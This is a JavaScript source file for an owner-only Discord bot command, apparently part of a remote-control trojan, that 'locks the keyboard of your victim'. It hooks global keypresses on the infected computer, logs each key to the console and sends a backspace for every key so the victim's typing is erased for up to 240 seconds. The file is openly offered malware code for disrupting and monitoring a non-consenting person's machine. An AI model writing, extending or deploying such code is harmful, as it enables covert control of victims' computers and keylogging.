const { ApplicationCommandOptionType } = require("discord.js"),
robot = require("@jitsi/robotjs"),
  gkm = require("gkm");

module.exports = {
  name: "lock-keyboard",
  ownerOnly: true,
  description: "lock the keyboard of your victim",
  options: [
    {
      name: "number",
      description: "1-240",
      required: true,
      type: ApplicationCommandOptionType.Number,
    },
  ],
  run: async (client, interaction, args) => {
    const msgnum = interaction.options.getNumber("number");
    await interaction.reply({
      content: `Keyboard Locked for ${msgnum} sec`,
      ephemeral: true,
    });
    await BlackKey(msgnum);
  },
};

async function BlackKey(durationInSeconds) {
  const startTime = Date.now();
  const durationInMilliseconds = durationInSeconds * 1000;

  while (Date.now() - startTime < durationInMilliseconds) {
    const keyEvent = await new Promise(resolve => {
      gkm.events.once("key.pressed", resolve);
    });

    const cle = keyEvent[0].toLowerCase();
    if (cle.includes("retour") || cle.includes("backspace")) continue;

    console.log(cle);
    robot.keyTap("backspace");
  }
}
